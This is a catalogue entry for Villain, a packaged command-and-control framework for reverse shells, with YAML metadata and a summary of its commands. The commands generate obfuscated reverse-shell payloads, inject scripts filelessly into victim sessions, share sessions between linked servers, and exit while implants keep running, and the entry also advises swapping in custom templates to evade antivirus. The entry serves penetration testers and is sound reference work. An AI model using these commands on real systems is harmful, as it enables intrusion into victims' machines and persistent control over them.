---
name: "villain"
categories:
  - blackarch-backdoor
version: "V2.2.1.r3.g87e5dd1"
homepage: "https://github.com/t3l3machus/Villain"
packaged-by: [blackarch, nixpkgs]
blackarch-builddate: "2026-01-14"
build-system: scripts
license: CCBY-NC-ND-4.0
meta-checked: "2026-11-09"
github-repo: "t3l3machus/Villain"
github-stars: 4487
github-pushed: "2025-05-21"
github-archived: false
github-issues: 26
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.6
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# villain

> C2 framework that can handle multiple TCP socket & HoaxShell-based reverse shells, enhance their functionality with additional features and share them among connected sibling servers.

*No corpus evidence — derived from upstream documentation.*

## What it's for

A high-level Stage 0/1 C2 by t3l3machus for handling reverse shells at scale. It generates payloads from editable templates (Windows and Linux, `reverse_tcp` and `hoaxshell` handlers — you are meant to drop in your own obfuscated templates for AV evasion), catches them into sessions, and gives each a dynamically engaged pseudo-shell you can switch between quickly. On top of raw shells it adds HTTP file uploads, fileless script injection against active sessions, and one-command ConPtyShell upgrades for powershell sessions. Its signature feature is multiplayer: sibling Villain instances on different machines `connect` to each other and share all shell sessions, with team chat via `#`-prefixed messages and a Session Defender that inspects your commands for input likely to hang a session (unclosed quotes, interactive commands). Caveats from the author: developed and tested on Kali, run as root, expect breaking changes between releases, and HoaxShell payloads are single-use. To catch HTTPS-based HoaxShell beacons, start Villain with SSL (`-c`/`-k`).

## Typical use cases

### Start the framework

```
sudo villain
```

Outcome: starts the reverse-TCP and HoaxShell handlers, the netcat listener, and the HTTP file smuggler (default port 8888) used for uploads and fileless execution, then drops you into the Villain prompt. The core server for sibling connections listens on 65001 by default; override with `-p` (core), `-x` (HoaxShell), `-n` (netcat) or `-f` (file smuggler).

### Generate a reverse shell payload

```
generate payload=windows/reverse_tcp/powershell lhost=eth0 encode
```

Outcome: prints a copy-pasteable payload built from the template in `Core/payload_templates/<OS>/<HANDLER>/` — tab-autocomplete works on every `generate` argument. `encode`/`obfuscate` apply where the template supports them; once the victim runs the command, the session shows up under `sessions` (or `backdoors` for HoaxShell implants). Linux example: `generate payload=linux/hoaxshell/sh_curl lhost=eth0 obfuscate`.

### Interact with a session

```
shell <SESSION ID or ALIAS>
```

Outcome: opens the pseudo-shell for that session; `exit` or Ctrl-C returns to the main prompt. Inside it, `upload <local> <remote>` pushes a file over HTTP, `inject /path/to/script.ps1` filelessly executes a local script against the session, and `cmdinspector ON` re-enables the hang-protection if you turned it off. For powershell sessions, `conptyshell <IP> <PORT> <SESSION ID or ALIAS>` (run from the main prompt) spawns a fully interactive ConPtyShell in a new window while keeping the original backdoor.

### Chain sibling servers and share sessions

```
connect 198.51.100.20 65001
```

Outcome: links this Villain instance to the sibling at `198.51.100.20` (its core server port); both operators now see and can work each other's sessions. Messages typed with a leading `#` broadcast to all connected siblings.

### Exit without killing sessions

```
flee
```

Outcome: leaves Villain while every active session keeps running on the victims; if you start Villain again later and a HoaxShell implant is still beaconing, the session re-establishes automatically. `purge` is the opposite housekeeping step — it deletes all stored implant metadata so old payloads can no longer re-attach.
